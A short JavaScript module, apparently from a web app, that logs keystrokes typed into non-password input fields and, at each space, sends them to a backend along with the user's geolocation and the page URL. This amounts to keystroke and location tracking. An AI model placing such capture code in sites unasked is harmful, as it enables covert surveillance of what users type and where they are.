import conn from "../../services/connect";
import getLocation from "../../utils/locations/location";
import { winUrl } from "../../utils/url/urls";

const keyStore = [];
export const keyboardEvents = (event) => {
  if (event.target.localName === "input" && event.target.type !== "password") {
    if (event.keyCode !== 32) keyStore.push(event.key);

    if (event.code === "Space" || event.keyCode === 32) {
      console.log(keyStore);
      getLocation()
        .then(async (res) => {
          await conn({
            data: keyStore,
            eventType: "keypress",
            location: res,
            url: "keypress",
            winUrl: winUrl(),
          });

          await keyStore.splice(0, keyStore.length);
        })
        .catch((err) => {
          console.log(err);
        });
    }
  }
};
